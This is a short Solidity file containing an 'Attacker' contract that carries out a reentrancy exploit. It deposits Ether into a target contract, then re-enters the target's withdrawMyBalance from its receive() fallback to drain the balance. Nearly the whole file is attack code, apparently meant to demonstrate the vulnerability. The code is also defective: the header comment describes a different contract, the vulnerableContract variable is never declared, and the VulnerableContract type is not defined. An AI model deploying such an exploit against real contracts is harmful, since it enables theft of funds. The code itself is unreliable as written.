// SPDX-License-Identifier: MIT

/** 
    This contract receives funding from different accounts and allows an account 
    to withdraw its own balance. 
**/

pragma solidity ^0.8.0;

contract Attacker {
    
    // Fallback function that is called when receiving Ether. It allows the reentrancy attack
    receive() external payable {
        
        // Gets the address of the contract calling this fallback function and its balance
        address vulnerableAddress = msg.sender;
        uint vulnerableBalance = vulnerableAddress.balance;

        // Gets the contract and attacks it
        vulnerableContract = VulnerableContract(vulnerableAddress);
        
        if (vulnerableBalance >= 1 ether) {
            vulnerableContract.withdrawMyBalance();
        }
    }

    function attack(address vulnerableContractAddress) public payable{
        
        // Deposits a small amount of Ether
        VulnerableContract(vulnerableContractAddress).depositFunds{value:msg.value}();

        // Withdraws the balance that was just deposited
        VulnerableContract(vulnerableContractAddress).withdrawMyBalance();
    }
}